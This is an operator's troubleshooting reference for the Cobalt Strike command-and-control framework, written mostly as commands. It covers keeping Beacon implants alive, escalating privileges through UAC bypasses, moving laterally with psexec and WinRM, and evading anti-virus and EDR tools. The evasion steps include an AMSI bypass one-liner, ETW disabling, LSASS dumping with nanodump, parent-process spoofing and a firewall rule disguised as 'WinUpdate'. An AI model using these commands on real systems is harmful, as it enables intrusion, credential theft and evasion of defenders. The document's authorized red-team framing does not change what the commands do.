# Cobalt Strike — Troubleshooting Reference (English)

> Solutions to common Cobalt Strike issues: Beacon connectivity, payload failures, injection errors, and team server problems.

---

## Table of Contents

1. [Beacon Not Connecting](#1-beacon-not-connecting)
2. [Beacon Disconnecting / Dying](#2-beacon-disconnecting--dying)
3. [Commands Not Returning Output](#3-commands-not-returning-output)
4. [Injection / execute-assembly Failures](#4-injection--execute-assembly-failures)
5. [Privilege Escalation Failures](#5-privilege-escalation-failures)
6. [Lateral Movement Failures](#6-lateral-movement-failures)
7. [DNS Beacon Issues](#7-dns-beacon-issues)
8. [SMB / TCP Beacon Issues](#8-smb--tcp-beacon-issues)
9. [Team Server Issues](#9-team-server-issues)
10. [Malleable C2 Profile Issues](#10-malleable-c2-profile-issues)
11. [Anti-Virus / EDR Detection Issues](#11-anti-virus--edr-detection-issues)
12. [Common Error Messages](#12-common-error-messages)
13. [Diagnostic Commands](#13-diagnostic-commands)

---

## 1. Beacon Not Connecting

### Symptom
Payload executed on target but no Beacon appears in CS sessions list.

### Diagnosis Steps

```
Step 1: Verify listener is running
  Cobalt Strike → Listeners → check status is "Up"

Step 2: Check team server firewall
  # On team server:
  netstat -tulnp | grep :443    # or your listener port
  iptables -L -n | grep 443

Step 3: Verify payload is correct listener
  # Regenerate payload and confirm listener name

Step 4: Test connectivity from target to team server
  # On target (via RCE or existing shell):
  Test-NetConnection -ComputerName <ts_ip> -Port 443
  # or:
  curl -k https://<ts_ip>/

Step 5: Check redirector configuration
  # Test redirector is passing through to TS:
  curl -v -k -H "Host: your-c2-domain.com" https://redirector_ip/search
```

### Common Causes & Fixes

| Cause | Fix |
|---|---|
| Firewall blocking port 443/80 on TS | Open iptables rule for C2 port |
| Wrong listener selected for payload | Regenerate with correct listener |
| Payload was killed by AV before execution | Bypass AV, or use in-memory staging |
| Network proxy blocks C2 traffic | Use DNS beacon or HTTPS with proxy-friendly profile |
| TLS certificate mismatch (for HTTPS) | Check cert matches domain in profile |
| Redirector not passing proper URI | Update mod_rewrite rules to match profile URIs |

### HTTPS Certificate Issues

```bash
# Verify certificate:
openssl s_client -connect ts_ip:443 -servername your-domain.com

# If cert mismatch:
# Regenerate or reinstall cert
# Update profile to match cert CN/SAN
```

---

## 2. Beacon Disconnecting / Dying

### Symptom
Beacon connects but then disappears or shows as "Not Responding".

### AV/EDR Killing Beacon in Memory

```
# Indicators:
- Beacon connects then dies after ~60 seconds (common scan interval)
- Beacon dies after running mimikatz/execute-assembly
- All Beacons on similar hosts die simultaneously

# Fixes:
1. Set sleep_mask "true" in Malleable C2 profile stage block
2. Set userwx "false" to avoid RWX memory
3. Set stomppe "true" and cleanup "true"
4. Use module stomping (module_x64 "wwanmm.dll")
5. Change spawnto to a more trusted process
```

### Target Process Crash

```
# If using inject:
- The process you injected into may have crashed
- Check: does the process still exist? beacon> ps → look for PID

# Prevention:
- Choose stable, long-lived processes for injection
- Avoid injecting into 32-bit processes with 64-bit Beacon
```

### Sleep Too Long / False Disconnect

```
# CS shows "Not Responding" but Beacon is still alive
# This is normal if sleep > CS timeout threshold

# Force immediate checkin:
beacon> checkin

# Adjust CS UI settings if needed:
# Cobalt Strike → Preferences → Appearance → [session timeout settings]
```

---

## 3. Commands Not Returning Output

### Symptom
Commands appear to run (no error) but output never appears.

### Diagnosis

```
# Check jobs:
beacon> jobs
# If task appears here, it's still running

# Check downloads:
beacon> downloads

# Increase sleep timeout (maybe output comes after next checkin):
beacon> sleep 0
# Re-run command
```

### Fork&Run Process Killed Before Output Returns

```
# Symptom: execute-assembly runs but no output
# Likely: EDR killed the sacrificial process before output was retrieved

# Fix 1: blockdlls start (prevents EDR DLL from loading into sacrificial process)
beacon> blockdlls start
beacon> execute-assembly Rubeus.exe triage

# Fix 2: Change spawnto
beacon> spawnto x64 C:\Windows\System32\svchost.exe
beacon> execute-assembly Rubeus.exe triage

# Fix 3: amsi_disable in profile
post-ex { set amsi_disable "true"; }
```

### Proxy / Firewall Blocking Large Responses

```
# Symptom: small commands work, large outputs fail
# Fix: split output into smaller chunks
# For large downloads, use Beacon download (not shell output)
beacon> download C:\large_file.txt
```

---

## 4. Injection / execute-assembly Failures

### "Access Denied" on inject / psinject

```
# Cause: insufficient privileges to open the target process
# Fix 1: Escalate privileges first
beacon> getsystem

# Fix 2: Choose a process in the same user context
beacon> ps    # find PID of process running as same user
beacon> inject <pid_same_user> x64 lab-https

# Fix 3: Steal token from higher-priv process first
beacon> steal_token <admin_pid>
beacon> inject <target_pid> x64 lab-https
```

### Architecture Mismatch

```
# Symptom: injection appears to succeed but Beacon dies immediately
# Cause: injecting x86 shellcode into x64 process or vice versa

# Fix: match arch to target process
beacon> ps    # check Arch column
beacon> inject 5120 x64 lab-https    # use x64 for 64-bit process
beacon> inject 5120 x86 lab-https    # use x86 for 32-bit process
```

### execute-assembly: Assembly Not Running / No Output

```
# Cause 1: AMSI blocking the .NET assembly
# Fix: enable amsi_disable in profile, or disable manually:
beacon> powerpick [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Cause 2: ETW telemetry causing detection
# Fix: disable ETW via BOF before running
beacon> inline-execute /opt/bofs/etw_disable.o
beacon> execute-assembly Rubeus.exe triage

# Cause 3: Wrong .NET version
# Fix: check which .NET version is on target
beacon> shell dir C:\Windows\Microsoft.NET\Framework64\

# Cause 4: Assembly requires GUI / stdin
# Some assemblies expect interactive input — they hang
# Use assemblies designed for non-interactive execution
```

---

## 5. Privilege Escalation Failures

### `getsystem` Fails

```
# Symptom: getsystem reports failure or hangs
# Cause 1: Already SYSTEM
beacon> getuid    # if already NT AUTHORITY\SYSTEM, no need

# Cause 2: UAC is active — getsystem doesn't bypass UAC
# Fix: elevate to high integrity first
beacon> elevate uac-token-duplication lab-https

# Cause 3: Named pipe exploit blocked
# Fix: try a different elevate technique
beacon> elevate uac-schtasks lab-https
```

### `elevate` Exploit Fails

```
# "Could not elevate: ..." messages

# UAC bypass techniques may be patched:
beacon> elevate uac-token-duplication lab-https    # try each
beacon> elevate uac-schtasks lab-https
beacon> elevate uac-cmstplua lab-https    # Elevate Kit

# Check current integrity level:
beacon> shell whoami /groups | findstr "Level"

# Verify: is UAC even enabled?
beacon> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA

# If UAC is disabled, getsystem should work directly from admin token
```

### Elevate Kit Not Loaded

```
# Elevate Kit exploits (sweetpotato, printspoofer, etc.) require loading Elevate Kit
# Load: Cobalt Strike → Script Manager → Load → elevate_kit.cna

# Without Elevate Kit loaded, custom exploits won't be available
```

---

## 6. Lateral Movement Failures

### `jump psexec` Fails

```
# Common errors:
"Access denied"
"Failed to connect to target"
"Service did not start"

# Fix 1: Verify credentials/token
beacon> getuid                    # confirm you have admin rights
beacon> make_token CORP\admin password
beacon> jump psexec dc01 lab-https

# Fix 2: Check SMB connectivity
beacon> portscan dc01 445 none 1
beacon> shell net use \\dc01\ADMIN$ /user:CORP\administrator password

# Fix 3: Windows Firewall blocking SMB
beacon> shell netsh advfirewall show currentprofile

# Fix 4: Try alternative technique
beacon> jump winrm64 dc01 lab-https    # use WinRM if SMB is blocked
```

### `jump winrm64` Fails

```
# Verify WinRM is enabled on target:
beacon> shell sc query winrm /s:dc01
beacon> shell netstat -an | findstr 5985    # WinRM port

# Enable WinRM on target (if you have admin shell):
beacon> shell winrm quickconfig -quiet
beacon> shell Enable-PSRemoting -Force
```

### Session Opens But Immediately Dies

```
# Symptom: "Opened" appears in event log but Beacon dies
# Likely: AV on the remote host killed the payload

# Fix: use a different payload method
beacon> jump psexec_psh dc01 lab-https    # PowerShell, not EXE
# Or: use SMB Beacon which lives in a sacrificial process
```

---

## 7. DNS Beacon Issues

### DNS Beacon Not Connecting

```
# Step 1: Verify DNS delegation
# On target:
nslookup type1.c2.corp.com
# Should return team server IP
# If NXDOMAIN: DNS delegation broken

# Step 2: Check TS is listening on UDP 53
netstat -ulnp | grep :53

# Step 3: Verify team server started with correct IP for DNS
./teamserver <DNS_LISTENER_IP> password

# Step 4: Check NS records
dig NS c2.corp.com @8.8.8.8    # should return your TS IP
```

### DNS Beacon Is Very Slow

```
# DNS is inherently slow — use it only when no HTTP(S) is available

# Speed up:
beacon> mode dns-txt    # TXT records carry more data per query
beacon> sleep 5 0       # very low sleep for DNS

# Check:
# Are DNS queries timing out? → firewall issue
# Are DNS queries making it to TS? → check tcpdump on TS
```

---

## 8. SMB / TCP Beacon Issues

### SMB Beacon Not Linking

```
# Symptom: "link" command hangs or fails

# Step 1: Verify SMB Beacon is running
beacon> ps    # look for the process with beacon SMB in it

# Step 2: Confirm pipe name
beacon> link 10.10.10.5 \\.\pipe\mojo.5688.8052.183894939787088877##

# Step 3: Check named pipe exists on target
beacon> shell dir \\.\pipe\

# Step 4: Check SMB firewall
beacon> portscan 10.10.10.5 445 none 1

# Step 5: Use Beacon-to-Beacon SMB (pivoting)
# If you can reach the host via SMB from another Beacon, link from there
```

### TCP Beacon Not Connecting

```
# Check port is open and listening:
beacon> shell netstat -ano | findstr LISTENING | findstr 4444

# Try connect:
beacon> connect 10.10.10.5 4444

# If blocked: firewall rule needed on target
beacon> shell netsh advfirewall firewall add rule name="WinUpdate" protocol=TCP dir=in localport=4444 action=allow
```

---

## 9. Team Server Issues

### Team Server Won't Start

```
# Check Java version:
java -version    # requires Java 11+

# Check profile syntax:
./c2lint profile.profile

# Check port 50050 availability:
netstat -tulnp | grep 50050

# Run with verbose output:
./teamserver -d 192.168.1.100 password    # check for error output
```

### Operators Can't Connect

```
# Check iptables:
iptables -L -n | grep 50050    # confirm operator IP is allowed

# Check SSL cert:
openssl s_client -connect ts_ip:50050

# Firewall test from operator machine:
nc -zv ts_ip 50050
```

### Team Server Running Out of Memory

```
# Large numbers of Beacons or heavy operations can consume memory

# Increase Java heap:
java -Xmx8g -XX:+UseG1GC -jar cobaltstrike.jar    # 8GB heap

# Archive old data:
# Cobalt Strike → Reporting → archive old sessions
```

---

## 10. Malleable C2 Profile Issues

### Profile Causes Team Server to Crash on Start

```
# Run c2lint first:
./c2lint myprofile.profile

# Common syntax errors:
# - Missing semicolon at end of set statement
# - Missing closing brace }
# - Invalid option name
# - String not properly quoted

# Test with minimal profile first, then add sections
```

### Beacons Connecting but Output Is Garbled

```
# Cause: Transform ordering mismatch between client/server blocks

# Fix: ensure client transform and server transform are inverse of each other
# Client sends: base64url → prepend → header
# Server parses: extract header → strip prepend → base64url decode
```

### Profile URIs Getting Blocked

```
# Symptom: Beacon connects initially, then dies after ~5 minutes
# Cause: Security device or proxy blocking the profile's URIs

# Fix: change URIs to something less suspicious
set uri "/search";         # common, hard to block
set uri "/api/v1/data";   # API-like, allowed by most firewalls
```

---

## 11. Anti-Virus / EDR Detection Issues

### Beacon Gets Killed by Windows Defender

```
# Quick bypass options:

# 1. Load a custom Artifact Kit (best long-term fix)
# Build and load: Cobalt Strike → Artifact Kit

# 2. Obfuscate with Donut + garble
donut -f beacon.exe -o beacon_donut.bin
garble -obfuscate beacon.exe    # for .NET assemblies

# 3. Add sandbox delays to payload
# Defender sandbox times out after ~3 minutes
# Use sleep-on-start in payload stager

# 4. Use encoded PS stager
powershell.exe -nop -w hidden -enc <base64>

# 5. Generate staged payload (smaller initial footprint)
# Stager itself is clean; only the second-stage Beacon needs to bypass

# 6. Use in-memory only (no file to scan):
# Web delivery → powershell one-liner
```

### EDR Killing Post-Ex Operations

```
# Operations being killed:
# - execute-assembly / powerpick → AMSI trigger
# - mimikatz → signature detection or LSASS protection
# - inject → parent-child correlation

# Fixes:
beacon> blockdlls start                       # block EDR DLL from loading into fork&run
beacon> spawnto x64 C:\Windows\System32\dllhost.exe  # use trusted spawnto
beacon> ppid 4812                              # spoof parent to legitimate process

# For AMSI bypass:
# In profile: post-ex { set amsi_disable "true"; }
# Or manually: beacon> powerpick [Ref].Assembly...

# For ETW bypass:
beacon> inline-execute /opt/bofs/etw_disable.o

# For LSASS dumping without detection:
beacon> inline-execute /opt/bofs/nanodump.o lsass 1
```

---

## 12. Common Error Messages

| Error | Cause | Fix |
|---|---|---|
| `Could not connect to team server` | TS down, wrong IP/port, firewall | Check TS running, iptables |
| `Beacon: Access is denied.` | Insufficient privileges | Elevate first |
| `Beacon: The system cannot find the file specified.` | File path wrong | Check path with `ls` |
| `Beacon: The handle is invalid.` | Handle closed or invalid token | `rev2self`, re-steal token |
| `fork&run failed` | spawnto process not found | Change `spawnto` path |
| `inject failed` | Can't open process / arch mismatch | Check arch, privileges |
| `[CS] Could not load: X` | Aggressor script syntax error | Check .cna syntax |
| `Connection reset by peer` | Firewall killing long connections | Adjust sleep, check firewall rules |
| `Could not load Malleable profile` | Profile syntax error | Run `c2lint` |

---

## 13. Diagnostic Commands

### Beacon Diagnostic

```
beacon> getuid                    # current user context
beacon> getpid                    # beacon PID
beacon> ps                       # process list — is beacon visible?
beacon> jobs                     # pending jobs
beacon> downloads                # in-progress downloads
beacon> shell netstat -ano       # network connections
beacon> shell tasklist /v        # verbose process list
beacon> shell whoami /all        # full token info
```

### Team Server Diagnostic

```bash
# Check TS process
ps aux | grep teamserver
netstat -tulnp | grep -E '50050|443|80|53'

# Check TS logs
tail -f /var/log/syslog | grep cobaltstrike

# Test listener
curl -v -k https://localhost:443/

# Check memory usage
free -h
ps aux --sort=-%mem | head -20
```

### Network Path Diagnostic

```
# From operator box → test TS:
nc -zv teamserver_ip 50050
curl -k https://teamserver_ip/

# From target → test TS (via Beacon):
beacon> shell curl -k https://redirector_domain/
beacon> portscan teamserver_ip 443 none 1
```

---

*Last updated: 2026-06-09 | Reference for authorized red team use only.*
